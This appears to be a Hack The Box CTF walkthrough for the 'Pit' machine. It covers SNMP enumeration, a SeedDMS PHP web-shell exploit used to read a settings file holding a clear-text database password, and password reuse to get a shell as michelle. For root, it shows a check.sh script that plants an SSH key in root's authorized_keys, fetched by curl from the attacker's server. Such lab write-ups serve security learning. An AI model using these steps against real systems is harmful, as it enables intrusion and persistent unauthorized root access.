# Pit 
#Linux #CTF #HTB 
Rank : Medium
IP : 10.10.10.241
OS : Linux 


```bash
echo "10.10.10.241 pit.htb dms-pit.htb" >> /etc/hosts
```


## Recon 

Nmap 
tcp scan 
```bash 
nmap -sV -sC -o scan pit.htb

PORT     STATE SERVICE         VERSION  
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)  
| ssh-hostkey:  
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)  
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)  
|\_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)  
80/tcp   open  http            nginx 1.14.1  
|\_http-server-header: nginx/1.14.1  
|\_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux  
9090/tcp open  ssl/zeus-admin?  
| fingerprint-strings:  
|   GetRequest, HTTPOptions:  
|     HTTP/1.1 400 Bad request  
|     Content-Type: text/html; charset=utf8  
|     Transfer-Encoding: chunked  
|     X-DNS-Prefetch-Control: off  
|     Referrer-Policy: no-referrer  
|     X-Content-Type-Options: nosniff  
|     Cross-Origin-Resource-Policy: same-origin  
|     <!DOCTYPE html>  
|     <html>  
|     <head>  
|     <title>  
|     request  
|     </title>  
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">  
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
|     <style>  
|     body {  
|     margin: 0;  
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;  
|     font-size: 12px;  
|     line-height: 1.66666667;  
|     color: #333333;  
|     background-color: #f5f5f5;  
|     border: 0;  
|     vertical-align: middle;  
|     font-weight: 300;  
|\_    margin: 0 0 10p  
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US  
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1  
| Not valid before: 2020-04-16T23:29:12  
|\_Not valid after:  2030-06-04T16:09:12  
|\_ssl-date: TLS randomness does not represent time
```

udp scan 
```bash
nmap -sU -sV pit.htb

PORT    STATE SERVICE VERSION  
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
```

On the HTTP we see a default nginx service, there also https server on 9090 which is a login page to CentOS

![[Pasted image 20210520173736.png]]

A quick look at the source tells us that is *Cockpit*

```html
/* Some browsers fail localStorage access due to corruption, preventing Cockpit login */    try {
```

In the scan we also learn of a sub domain *dms-pit.htb* lets add that to the hosts file. which return us with HTTP code 403. 

 SNMP is a protocol used to monitoring and remote manage devices. Lets see what we can learn from it. 
 
 
[snmpbw](https://github.com/dheiland-r7/snmp)

install snmp and perl module using cpan 

```bash
apt-get install snmp
cpan -i NetAddr::IP
perl snmpbw.pl pit.htb public 2 1

1.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8\_3.x86\_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86\_64"  
.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.8072.3.2.10  
.1.3.6.1.2.1.1.3.0 = Timeticks: (948405) 2:38:04.05  
.1.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"  
.1.3.6.1.2.1.1.5.0 = STRING: "pit.htb"  
.1.3.6.1.2.1.1.6.0 = STRING: "Unknown (edit /etc/snmp/snmpd.conf)"
....snip...
Login Name           SELinux User         MLS/MCS Range        Service  
  
\_\_default\_\_          unconfined\_u         s0-s0:c0.c1023       \*  
michelle             user\_u               s0                   \*  
root                 unconfined\_u         s0-s0:c0.c1023       \*
```

We got our first user *michelle*

 
 Because it easy to overlook thing when scroll trough the file I did some grep on the result with some of the information we have learned so far. 
 ```bash
 └──╼ $cat 10.10.10.241.snmp | grep dms  
.1.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
 ```
  and I got a dir to the dms sub domain. 
  
```bash
└──╼ $cat 10.10.10.241.snmp | grep bin
.1.3.6.1.2.1.25.4.2.1.4.987 = STRING: "/sbin/auditd"  
.1.3.6.1.2.1.25.4.2.1.4.989 = STRING: "/usr/sbin/sedispatch"  
.1.3.6.1.2.1.25.4.2.1.4.1021 = STRING: "/usr/bin/dbus-daemon"  
.1.3.6.1.2.1.25.4.2.1.4.1022 = STRING: "/usr/sbin/irqbalance"  
.1.3.6.1.2.1.25.4.2.1.4.1027 = STRING: "/usr/bin/VGAuthService"  
.1.3.6.1.2.1.25.4.2.1.4.1028 = STRING: "/usr/bin/vmtoolsd"  
.1.3.6.1.2.1.25.4.2.1.4.1029 = STRING: "/usr/sbin/sssd"  
.1.3.6.1.2.1.25.4.2.1.4.1031 = STRING: "/usr/sbin/chronyd"  
.1.3.6.1.2.1.25.4.2.1.4.1040 = STRING: "/sbin/rngd"  
.1.3.6.1.2.1.25.4.2.1.4.1112 = STRING: "/usr/sbin/NetworkManager"  
.1.3.6.1.2.1.25.4.2.1.4.1119 = STRING: "/usr/sbin/sshd"  
.1.3.6.1.2.1.25.4.2.1.4.1142 = STRING: "/usr/sbin/crond"  
.1.3.6.1.2.1.25.4.2.1.4.1154 = STRING: "/sbin/agetty"  
.1.3.6.1.2.1.25.4.2.1.4.1184 = STRING: "nginx: master process /usr/sbin/nginx"  
.1.3.6.1.2.1.25.4.2.1.4.1550 = STRING: "/usr/sbin/rsyslogd"  
.1.3.6.1.2.1.25.4.2.1.4.1553 = STRING: "/usr/sbin/snmpd"  
.1.3.6.1.2.1.25.4.2.1.5.1072 = STRING: "-s /usr/sbin/firewalld --nofork --nopid"  
.1.3.6.1.2.1.25.4.2.1.5.1122 = STRING: "-Es /usr/sbin/tuned -l -P"  
.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```
 
List of executable we able to execute using snmp. 
 
![[Pasted image 20210520181902.png]]

[seedms](https://www.seeddms.org/index.php?id=2)
It a free document management system for web based user interface. 
 
 The default cred of *admin* did not work. 
 After abit of think i tired *michelle* for both user and pass. 
 And we got access. 
 
 ![[Pasted image 20210520183217.png]]
 
 Lets head to *exploit-db.com* and do a quick search on *seeddms*
And we find a few results, I like the one that allows RCE 

[exploit](https://www.exploit-db.com/exploits/47022)

## Exploit 

Follow the exploit and upload the php shell code to get RCE on the machine. 

Once you have it time to look for files of value. 
like configuration files 
After abit of enumulation I learn of a setting file which have the password to the database in clear text. 
```url
http://dms-pit.htb/seeddms51x/data/1048576/36/1.php?cmd=cat+../../../conf/settings.xml
```
```html
<database dbdriver="mysql" dbhostname="localhost" dbdatabase="seeddms" dbuser="seeddms" dbpass="ied^ieY6xoquu" donotcheckversion="false">
    </database>
```
 
 We now have creds for the database
 
 *seeddms/ied^ieY6xoquu*
 
 Lets see if they reused the password else where on the box. 
 Go back to the other login page on port *9090* and try the different username you have learned with the password. 
 
 bingo *michelle/ied^ieY6xoquu* works. 
 
 ![[Pasted image 20210520185712.png]]
 
 Go down to *Terminal* get shell access as michelle and get the user flag
 
 
 ## Privileged escalation 
 
 Lets first check if we can do anything as sudo 
 ```bash
 sudo -l
 
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for michelle: 
sudo: unable to stat /var/db/sudo: Permission denied
Sorry, user michelle may not run sudo on pit.
 ```
 
Nope, lets try something else. 

I notices during the dump a file called *monitor* located in /usr/bin/monitor let see what it does. 
 
 ```
 michelle@pit usr]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

So it execute a file in another location. 

```bash
[michelle@pit local]$ ls /usr/local/monitoring
ls: cannot open directory '/usr/local/monitoring': Permission denied
```

We do not have permission to view the folder

```bash
[michelle@pit local]$ ls -all
total 0
drwxr-xr-x. 13 root root 149 Nov  3  2020 .
drwxr-xr-x. 12 root root 144 May 10 05:06 ..
drwxr-xr-x.  2 root root   6 Nov  3  2020 bin
drwxr-xr-x.  2 root root   6 Nov  3  2020 etc
drwxr-xr-x.  2 root root   6 Nov  3  2020 games
drwxr-xr-x.  2 root root   6 Nov  3  2020 include
drwxr-xr-x.  2 root root   6 Nov  3  2020 lib
drwxr-xr-x.  3 root root  17 May 10 05:06 lib64
drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec
drwxrwx---+  2 root root 122 May 21 00:45 monitoring
drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin
drwxr-xr-x.  5 root root  49 Nov  3  2020 share
drwxr-xr-x.  2 root root   6 Nov  3  2020 src
```
 
We can see the + at the ends indicating access control list (ACL), providing an more flexible permission level. 

```bash
[michelle@pit local]$ getfacl monitoring/
# file: monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```
 
 We can see other use have rwx on the folder but michelle have wx on it. We should be able to create file inside the folder that follow the naming convention of monitoring script *check\*.sh* and it should then get executed by the script  
 
 Generate a new key pair using ssh-keygen, I created one with the name of pit, then take the public key and create a file with the name of *check.sh* which i similar to this but with your own public key. 
 ```bash 
#!/bin/bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGEOGHvxtcSC+4ULA5rnk6odfkTO4C9KTKD8VE8soZ4Wlfra1EvI7YQGLt1AahPQOuTwocRyYdQ9St3eMTcl0ElRUdKuaz75WlVZ22c39bLHlON/yxHtfvtYWgGJW4lApYXGyiKfGydtyl5lDtzMsa1+DAN1rfl5sOj7dMJGj4Onq/v15lyHxz09CpfMIwPQNGJMou4yv1LD5GOqwsEFbQx/u/Q7DsjG1DPyXM3xftK85y9aGU9SF1LOtcxSCQ7Cr1DEtWhLB6l8m98k9r5O4oiih6zjCh2Zm7+j4wzN9o9dI3UzHZybJaGLsyUqvc7dx3gvyp8+AphyCtH6KvfN6cIje9nBchwIFc6pgiimNZWz6Ec34EV4WoshCDFoCy+DQ8i5VdHxZpTLaQmLybCC0bOWZqU9NCTwEEBcZM6i5HcP7yBWH1nBfpiFO6y1qiY+r0Q33zqa07H2ExxHZvqcBg7l5p5wH7b1BnHc0vjxT+k+uBlhbm9CqQgE3xSZ+R/98= avhn@avhn
" > /root/.ssh/authorized_keys
 ```
 
startup a python http server 
```bash
python3 -m http.server
```
 
 On the target machine transfer the file over. The file get removed after a period of time. So you have to be quick about it. 
 ```bash
 curl http://10.10.14.19:8000/check.sh -o check.sh
 ```
 
 Execute the monitoring command using snmp. 
 I tried using the OID of monitor but it did not work. 
 ```
 snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103
 ```
 
 
```bash
snmpwalk -m all -v2c -c public pit.htb nsExtendObjects
```

 
```bash
ssh -i pit root@pit.htb
```
 
 And we got root access. 
## Writeups 
![[HTB-PIT-Writeup-2.pdf]]

